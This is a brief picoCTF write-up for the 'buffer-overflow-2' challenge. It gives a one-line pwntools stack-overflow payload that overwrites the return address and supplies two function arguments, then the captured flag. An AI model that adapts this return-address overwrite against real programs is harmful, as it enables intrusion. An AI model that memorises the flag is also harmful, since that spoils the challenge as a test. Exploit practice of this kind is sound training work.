[Category:Picoctf](/Category:Picoctf "wikilink") Alright, this time
you'll need to control some arguments. Can you get the flag from this
program? You can find it in
/problems/buffer-overflow-2_3_02aff35ae94896082cad513865e6c2eb on the
shell server. Source.

python -c "from pwn import \*; print
'a'\*(100+12)+p32(0x080485cb)+'P'\*4+p32(0xDEADBEEF)+p32(0xDEADC0DE)" |
./vuln

picoCTF{addr3ss3s_ar3_3asya4104c14}